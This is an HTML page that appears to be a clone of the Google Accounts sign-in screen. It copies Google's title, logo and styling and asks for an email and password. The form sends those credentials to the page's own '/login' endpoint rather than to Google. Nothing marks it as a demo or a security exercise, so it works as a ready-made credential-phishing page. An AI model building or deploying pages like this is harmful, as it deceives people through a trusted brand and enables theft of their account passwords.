<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            border: 1px solid #dadce0;
            padding: 48px 40px 36px;
            border-radius: 8px;
            width: 360px;
            text-align: center;
        }
        img { width: 75px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 10px; color: #202124; font-weight: 400; }
        p { color: #202124; margin-bottom: 30px; font-size: 16px; }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        button {
            float: right;
            padding: 10px 24px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { background-color: #1557b0; }
        .footer {
            text-align: left;
            margin-top: 40px;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" alt="Google">
        <h2>Sign in</h2>
        <p>to continue to Portfolio</p>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-top: 5px; cursor: pointer;">Forgot email?</div>
            <button type="submit">Next</button>
        </form>
        <div class="footer">Create account</div>
    </div>
</body>
</html>
